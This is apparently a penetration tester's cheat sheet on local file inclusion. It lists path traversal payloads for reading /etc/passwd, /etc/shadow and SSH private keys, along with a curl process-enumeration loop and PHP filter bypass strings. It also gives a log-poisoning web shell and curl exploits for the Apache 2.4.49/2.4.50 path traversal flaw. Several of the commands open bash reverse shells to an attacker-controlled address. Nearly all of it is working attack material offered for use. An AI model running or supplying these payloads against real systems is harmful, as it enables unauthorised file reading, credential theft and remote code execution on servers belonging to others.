LFI Common Files
---
#LFI #files #RFI

```lists
../../../../../../../etc/passwd
../../../../../../../etc/passwd?
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd^^
.[\\./.\\./.\\./.\\./etc/passwd](file://./etc/passwd)
....................//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//..../etc/passwd
..///..////etc/passwd
..[\\..\\..\\..\\..\\..\\/etc/passwd](file://../../../../../etc/passwd)
..[\\\..\\\..\\\..\\\..\\\/etc/passwd](file://../../../../etc/passwd)
.\/\.\.\/\.\/etc/passwd
../../../../../../../proc/self/cmdline
../../../../../../../proc/self/environ
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/version
/proc/cmdline
/proc/self/cmdline
/etc/issue
/var/www/.htaccess
/var/www/.htpasswd
/etc/shadow
/etc/group
/etc/motd
/etc/mysql/my.cnf
/etc/apache2/apache2.conf
/etc/apache2/conf/httpd.conf
../../../../../../home/USERNAME/.ssh/id_rsa
/var/log/auth.log #log poisoning via SSH
/etc/apache2/sites-available/000-default.conf
/windows/win.ini
```

Windows:

```text
c:\apache\logs\access.log
c:\apache\logs\error.log
C:\inetpub\wwwroot\
```

Word / file lists:

```lists
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

Do 1-1000 to enum processes:
---
#enum #enumeration #process #process-enumeratio 

```shell
for i in $(seq 900 1000); do curl $TARGET_URL/?file=../../../../proc/$i/cmdline -o -; echo " PID => $i"; done
```

Bypass simple filters and other bypasses:
---
#lfi #filter #bypass

```php
' and die(show_source('/etc/passwd')) or '
' and die(system("/bin/bash -c 'bash -i >& /dev/tcp/$TARGET_IP/4444 0>&1'")) or ' #fo rev shell
php://fd/3php://fd/3
php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd
data:text/plain,<?php phpinfo(); ?>data:text/plain,<?php phpinfo(); ?>
```


```bash
#execute id command
curl -s --path-as-is "$TARGET_URL/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"
#read the contents of index.php
curl -s --path-as-is "$TARGET_URL/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../var/www/html/index.php"
```

Log poisoning:
```burp-suite
User-Agent: CHROME <?php echo system($_GET['exec']);?>
```
Then execute the poisoned log file by including it:
```bash
#linux
curl -s --path-as-is $TARGET_URL/../../../../../../../../../var/log/apache2/access.log&exec=ls
#windows using xampp
curl -s --path-as-is $TARGET_URL/../../../../../../../../../xampp/apache/logs/access.log&exec=dir
```


Apache 2.4.49 / Apache 2.5.50 Path traversal and RCE:
---
#apache-rce #apache-2449 #apache-2550 
read /etc/passwd:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; " "$TARGET_IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```
or
```bash
curl "http://$TARGET_IP/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" --data 'echo Content-Type: text/plain; echo;' -s
```
execute /bin/bash for a reverse shell in 2.4.49:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -c \"bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1\"" "$TARGET_IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```
and for 2.4.50:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -c \"bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1\"" "$TARGET_IP/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"
```